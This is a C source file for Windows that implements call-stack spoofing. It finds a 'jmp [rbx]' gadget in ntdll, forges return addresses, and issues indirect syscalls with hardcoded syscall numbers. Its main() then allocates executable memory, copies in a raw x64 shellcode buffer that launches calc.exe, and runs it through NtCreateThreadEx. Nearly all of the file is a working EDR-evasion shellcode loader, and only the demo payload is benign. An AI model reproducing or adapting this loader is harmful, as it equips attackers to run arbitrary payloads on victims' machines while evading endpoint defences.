#include <windows.h>
#include <stdio.h>

#define PATCH_X( function, module, SSN )                                            Patch( function, module, SSN, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_A( function, module, SSN, a )                                         Patch( function, module, SSN, ( PVOID ) ( a ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_B( function, module, SSN, a, b )                                      Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_C( function, module, SSN, a, b, c )                                   Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_D( function, module, SSN, a, b, c, d )                                Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_E( function, module, SSN, a, b, c, d, e )                             Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_F( function, module, SSN, a, b, c, d, e, f )                          Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_G( function, module, SSN, a, b, c, d, e, f, g )                       Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), NULL, NULL, NULL, NULL, NULL, NULL )
#define PATCH_H( function, module, SSN, a, b, c, d, e, f, g, h )                    Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), ( PVOID ) ( h ), NULL, NULL, NULL, NULL, NULL  )
#define PATCH_I( function, module, SSN, a, b, c, d, e, f, g, h, i )                 Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), ( PVOID ) ( h ), ( PVOID ) ( i ), NULL, NULL, NULL, NULL )
#define PATCH_J( function, module, SSN, a, b, c, d, e, f, g, h, i, j )              Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), ( PVOID ) ( h ), ( PVOID ) ( i ), ( PVOID ) ( j ), NULL, NULL, NULL )
#define PATCH_K( function, module, SSN, a, b, c, d, e, f, g, h, i, j, k )           Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), ( PVOID ) ( h ), ( PVOID ) ( i ), ( PVOID ) ( j ), ( PVOID ) ( k ), NULL, NULL )
#define PATCH_L( function, module, SSN, a, b, c, d, e, f, g, h, i, j, k, l )        Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), ( PVOID ) ( h ), ( PVOID ) ( i ), ( PVOID ) ( j ), ( PVOID ) ( k ), ( PVOID ) ( l ), NULL )
#define PATCH_M( function, module, SSN, a, b, c, d, e, f, g, h, i, j, k, l, m )     Patch( function, module, SSN, ( PVOID ) ( a ), ( PVOID ) ( b ), ( PVOID ) ( c ), ( PVOID ) ( d ), ( PVOID ) ( e ), ( PVOID ) ( f ), ( PVOID ) ( g ), ( PVOID ) ( h ), ( PVOID ) ( i ), ( PVOID ) ( j ), ( PVOID ) ( k ), ( PVOID ) ( l ), ( PVOID ) ( m ) )
#define SETUP_ARGS( arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17, ... ) arg17
#define PATCH_MACRO_CHOOSER( ... ) SETUP_ARGS(__VA_ARGS__, PATCH_M, PATCH_L, PATCH_K, PATCH_J, PATCH_I, PATCH_H, PATCH_G, PATCH_F, PATCH_E, PATCH_D, PATCH_C, PATCH_B, PATCH_A, PATCH_X)
#define PATCH( ... ) PATCH_MACRO_CHOOSER (__VA_ARGS__ )( __VA_ARGS__ )

extern PVOID Fixup( );
/*
Find a gadget by searching the text section of a given module

@ Params
    Module      - A pointer to the base of the module to search through
    GadgetBytes - A string representing the hex bytes of the gadget
    GadgetAddr  - A pointer to a pointer; it will be populated if a gadget is successfully found

@ Return
    1 for success, 0 for failure
*/
BOOLEAN FindGadget( PBYTE Module, LPSTR GadgetBytes, PVOID* GadgetAddr, DWORD szGadget )
{
    if ( !GadgetAddr ) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS   NT   = Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew;
    PVOID               Base = Module + IMAGE_FIRST_SECTION( NT )->VirtualAddress; 
    DWORD               Size = IMAGE_FIRST_SECTION( NT )->SizeOfRawData;

    // Iterate through the .text section and find a gadget
    for ( PBYTE current = Base; current <= Base + Size-szGadget; current++ ) {
        if ( !memcmp( current, GadgetBytes, szGadget ) ) {
            *GadgetAddr = current;
            return TRUE;
        }
    }

    return FALSE;
}

// Compiler sometimes optimizes things out, keep things unoptimized to be safe
__attribute__( ( optimize( "-O0" ) ) )
PVOID Patch( PVOID Function, PVOID Module, PVOID SSN, PVOID a, PVOID b, PVOID c, PVOID d, PVOID e, PVOID f, PVOID g, PVOID h, PVOID i, PVOID j, PVOID k, PVOID l, PVOID m )
{    
    PVOID   Rsp            = NULL;
    SIZE_T  TotalDecrement = 0x200;
    PVOID   Gadget         = NULL;
    PVOID   RetValue       = NULL;

    // 0xffd3 is a `jmp [rbx]` gadget; the code Patch function is implemented for that gadget
    if ( !Module ) {
        Module = GetModuleHandleA( "ntdll.dll" );
    }
    if ( !FindGadget( Module, "\xff\x23", &Gadget, 2 ) ) {
        printf( "We could not find a gadget!" );
        return NULL;
    }

    // Get our RSP
    __asm__ volatile (
        "mov rax, rsp\n"
        : "=r" ( Rsp )
    );

    // Ensure we are not 16 byte aligned.
    if ( ( SIZE_T ) Rsp % 16 == 0 ) {
        TotalDecrement += 0x8;
    }

    // Do not call printf from this point on. May clobber this setup.
    // Don't do debugbreaks either
    // Patch the return address
    *( PVOID* )( Rsp - TotalDecrement + 0x00 + ( 8 * 0 ) ) = Gadget;

    // Place the stack args
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 0 ) ) = e;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 1 ) ) = f;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 2 ) ) = g;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 3 ) ) = h;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 4 ) ) = i;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 5 ) ) = j;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 6 ) ) = k;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 7 ) ) = l;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 8 ) ) = m;
    
    if ( Function ) {

        PVOID temp      = NULL;
        PVOID nonvol    = NULL;
        PVOID pFixup    = Fixup;

        // Move first 4 args
        // Our rsp is normal, can tell compiler to use memory addrs
        __asm__ volatile (
            "mov rcx, %1\n"
            "mov rdx, %2\n"
            "mov r8, %3\n"
            "mov r9, %4\n"
            : "=r" ( temp )
            : "m" ( a ), "m" ( b ), "m" ( c ), "m" ( d )
        );

        // Store original value of rbx
        // Specify the arg regs as clobbers so compiler doesn't use em
        __asm__ volatile (
            "mov %1, rbx\n"
            "mov rbx, %2\n"
            : "=r" ( temp )
            : "m" ( nonvol ) ,"r" ( &pFixup )
            : "rcx", "rdx", "r8", "r9"
        );
                      
        // Set SSN and jump to function
        __asm__ volatile (
            "mov r10, rcx\n"
            "mov r11, %1\n"
            "mov rax, %2\n"
            "sub rsp, %3\n"
            "jmp r11\n"
            : "=c" ( temp )
            : "m" ( Function ), "m" ( SSN ), "m" ( TotalDecrement )
        );

        // Handler to catch the gadget return
        // Specify rax as clobber so we dont overwrite our ret value
        __asm__ volatile (
            "Fixup: \n"
            "mov rbx, %1\n"
            : "=r" ( temp )
            : "m" ( nonvol )
            : "rax"
        );

        // Fix our rsp and store the ret value
        __asm__ volatile (
            "add rsp, %1\n"
            "sub rsp, 0x8\n" // Account for the pop from ret since we jmped
            : "=a" ( RetValue )
            : "m"  ( TotalDecrement )
        );
        return RetValue;
    }
    return NULL;
}
void main()
{
    PVOID    ReturnAddress = NULL;
    NTSTATUS status        = 0;

    MessageBoxA( NULL, "WKLSEC -- Normal", "WKLSEC", MB_OK );
    PATCH( MessageBoxA, NULL, NULL, NULL, "WKLSEC -- Spoofed", "WKLSEC", MB_OK );

    PVOID pPrintf = GetProcAddress( LoadLibraryA( "msvcrt.dll" ), "printf" );
    
    // 0 stack args
    for ( int i = 0; i < 2; i++ )
    {
        PATCH( pPrintf, NULL, NULL, "[+] Iteration %d\n", i );
        PATCH( Sleep, NULL, NULL, 4000 );
        PATCH( pPrintf, NULL, NULL, "[+] Returning to 0x%llx\n", __builtin_return_address( 0 ) );
    }
     // 1 stack arg
    
    for ( int i = 0; i < 4; i++ )
    {
        PVOID alloc = PATCH( VirtualAllocEx, NULL, NULL, -1, 0, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        PATCH( pPrintf, NULL, NULL, "[+] Allocated to 0x%llx\n", alloc );
    }

    // 2 stack arg
    PVOID pNtAllocateVirtualMemory = GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory" );
    for ( int i = 0; i < 4; i++ )
    {
        DWORD  Status    = NULL;
        PVOID  alloc     = NULL;
        SIZE_T size      = 1024;
        PVOID  base      = NULL;
        Status = PATCH( pNtAllocateVirtualMemory, NULL, NULL, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        PATCH( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, NtAllocated to 0x%llx\n", Status, alloc );
    }

    // Syscalls
    pNtAllocateVirtualMemory = ( PBYTE ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory" ) + 0x12;
    for ( int i = 0; i < 4; i++ )
    {
        DWORD  Status    = NULL;
        PVOID  alloc     = NULL;
        SIZE_T size      = 1024;
        PVOID  base      = NULL;
        // Good call
        Status = PATCH( pNtAllocateVirtualMemory, NULL, 0x18, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        PATCH( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, Syscall-Allocated to 0x%llx\n", Status, alloc );
        // Bad call
        Status = PATCH( pNtAllocateVirtualMemory, NULL, 0x18, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, 0x1049578394 );
        PATCH( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, from incorrect param\n", Status );
    }
    
    // Shellcode Load
    DWORD  Status    = NULL;
    PVOID  alloc     = NULL;
    SIZE_T size      = 1024;
    PVOID  base      = NULL;
    unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    pNtAllocateVirtualMemory = ( PBYTE ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory" ) + 0x12;
    Status = PATCH( pNtAllocateVirtualMemory, NULL, 0x18, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    PATCH( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, Syscall-Allocated to 0x%llx\n", Status, alloc );

    memcpy( alloc, buf, sizeof( buf ) );

    PVOID  pNtCreateThreadEx = ( PBYTE ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtCreateThreadEx" ) + 0x12;
    HANDLE hThread           = NULL;
    Status = PATCH( pNtCreateThreadEx, NULL, 0xBC, &hThread, THREAD_ALL_ACCESS, NULL, -1, alloc, NULL, NULL, NULL, NULL, NULL, NULL );
    PATCH( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, Syscall-CreateThread to 0x%llx\n", Status, alloc ); 

    getchar();
}